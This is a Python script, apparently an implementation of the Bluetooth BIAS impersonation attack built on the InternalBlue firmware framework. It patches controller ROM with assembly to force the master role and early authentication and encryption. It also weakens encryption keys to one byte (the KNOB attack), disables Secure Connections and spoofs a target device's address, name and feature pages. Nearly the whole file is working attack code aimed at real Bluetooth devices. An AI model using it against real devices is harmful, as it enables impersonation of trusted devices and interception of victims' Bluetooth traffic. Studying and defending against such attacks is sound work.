# bias.py

"""
Use it with internalblue

"""
#!/usr/bin/python2

from pwn import *
from internalblue.hcicore import HCICore

internalblue = HCICore()
internalblue.interface = internalblue.device_list()[0][1]

# setup sockets
if not internalblue.connect():
    log.critical("No connection to target device.")
    exit(-1)



log.info("BEGIN patchrom.")

# patch1: make sure we always switch to master role
code1 = b"""
        @Part 1: Make sure we always switch roles
        mov r6, #0x0
        sub sp, #0x18
        add r0, #0xc
        b 0x2e7ad
        """
addrcode1 = 0x2006d0
taddrcode1 = addrcode1 + 1  # 0x2006d1
# write code1 into addrcode1 (SRAM)
code1Bytes = asm(code1, addrcode1)
internalblue.writeMem(addrcode1, code1Bytes)
# patch rom
addrpatch1 = 0x2e7a8
patch1 = asm("b {}".format(str(hex(taddrcode1))), vma=addrpatch1)
internalblue.patchRom(addrpatch1, patch1)


# patch 2: immediately authenticate after setup

code1len = len(code1Bytes)
# 4-byte align
code1len += 4 - (code1len % 4)

code2 = b"""
        @save lr
        push {lr}

        @call lm_HandleHciAuthenticationReq
        bl 0xaec11

        @make up for what we overwrote
        mov r0, #0x0
        str r0, [sp, #0x0]

        @restore lr
        pop {lr}

        @return
        b 0x11a5d
        """

# write code2 into SRAM
code2Bytes =  asm(code2, addrcode1+code1len)
internalblue.writeMem(addrcode1+code1len, code2Bytes)

code2len = len(code2Bytes)
# 4-byte align
code2len += 4 - (code2len % 4)

# patch rom
addrpatch2 = 0x11a58
patch2 = asm("b 0x{:x}".format(taddrcode1 + code1len), vma=addrpatch2)
internalblue.patchRom(addrpatch2, patch2)



# patch 3: immediately enable encryption after authentication
code3 = b"""
        @ save registers
        push {r0, r1, lr}

        @ set bit 4 in encryptionRelatedFlagsAlsoWhetherEDR. note
        @ that r4 contains ACLConn throughout the function
        ldr r1, [r4, #0xa3]
        orr r1, r1, #0x10
        str r1, [r4, #0xa3]

        @ call SendLmpEncryptModeReq
        mov r0, r4
        ldr r1, =#0x1
        bl 0xaf2c5

        @ make up for what we overwrote
        ldrh.w r1, [r4, #0x64]

        @ restore registers
        pop {r0, r1, lr}

        @ return
        b 0x11ce9
        """

# write code3 into SRAM
code3Bytes =  asm(code3, addrcode1+code1len+code2len)
internalblue.writeMem(addrcode1+code1len+code2len, code3Bytes)

# patch rom
addrpatch3 = 0x11ce4
patch3 = asm("b 0x{:x}".format(taddrcode1+code1len+code2len), vma=addrpatch3)
internalblue.patchRom(addrpatch3, patch3)

log.info("END patchrom.")


log.info("BEGIN impersonation.")

# KNOB attack
lmin = "\x01"
addrlmin = 0x20118a
lmax = "\x01"
addrlmax = 0x20118b
internalblue.writeMem(addrlmin, lmin)
internalblue.writeMem(addrlmax, lmax)

# btadd in little endian
btadd_le = "\x5f\xbf\xa8\x36\x4e\x40"
internalblue.sendHciCommand(0xfc01, btadd_le)

btname = "Name\x00"
addrbtname = 0x200f48
internalblue.writeMem(addrbtname, btname)

# LMP_version
specSupport = struct.unpack("<I", internalblue.readMem(0x200f12, 4))[0]
specSupport &= 0xfffffe00
lmpver = 9
if lmpver == 10:  # Bluetooth 5.1
    specSupport |= 0x100
elif lmpver == 9:  # Bluetooth 5.0?
    specSupport |= 0x80
elif lmpver == 8:  # Bluetooth 4.2?
    specSupport |= 0x40
elif lmpver == 7:  # Bluetooth 4.1
    specSupport |= 0x20
elif lmpver == 6:  # Bluetooth 4.0
    specSupport |= 0x10
elif lmpver == 4:
    specSupport |= 0x4
elif lmpver == 3:
    specSupport |= 0x1
elif lmpver == 2:
    pass
else:
    raise Exception
internalblue.writeMem(0x200f12, struct.pack("<I", specSupport))

# Company Id
companyid = 15
addrcompanyid = 0x205c28
internalblue.writeMem(addrcompanyid, struct.pack("<H", companyid))

# Subversion Number
subversion = 24841
addrsubversion = 0x200f3c
internalblue.writeMem(addrsubversion, struct.pack("<H", subversion))

# LMP feature page 0
lmpfp0 = b"\xff\xfe\x8f\xfe\xd8\x3f\x5b\x87"
addrlmpfp0 = 0x200f24
internalblue.writeMem(addrlmpfp0, lmpfp0)

# LMP feature page 1
lmpfp1 = b"\x0f\x00\x00\x00\x00\x00\x00\x00"
addrlmpfp1 = 0x200f2c
internalblue.writeMem(addrlmpfp1, lmpfp1)

# LMP feature page 2
lmpfp2 = b"\x45\x03\x00\x00\x00\x00\x00\x00"
addrlmpfp2 = 0x200f34
internalblue.writeMem(addrlmpfp2, lmpfp2)

# Disable Secure Connections
byte1 = struct.unpack("<B", internalblue.readMem(addrlmpfp1, 1))[0]
internalblue.writeMem(addrlmpfp1, struct.pack("<B", byte1 & 0b11110111))
byte2 = struct.unpack("<B", internalblue.readMem(0x200f12, 1))[0]
internalblue.writeMem(0x200f12, struct.pack("<B", byte2 & 0b11011111))

# iocaps and authreq
iocaps = "\x01"
authreq = "\x03"
addrcapsauth = 0x20113d
capsAndAuth = struct.pack("<B", struct.unpack("<B", iocaps)[0] | (struct.unpack("<B", authreq)[0] << 4))
internalblue.writeMem(addrcapsauth, capsAndAuth)

# oobdata, 0 is False and 1 is True
oobdata = 0
addroobdata = 0x20113e
bytePrev = struct.unpack("<B", internalblue.readMem(addroobdata, 1))[0]
byteNew = struct.pack("<B", (bytePrev & 0xfe) | oobdata)
internalblue.writeMem(addroobdata, byteNew)

# device class
deviceclass = b"\x0c\x02\x5a"
addrdeviceclass = 0x0c24
internalblue.sendHciCommand(addrdeviceclass, deviceclass)

log.info("END impersonation.")


internalblue.shutdown()
exit(-1)
log.info("Ready to connect to a victim slave")
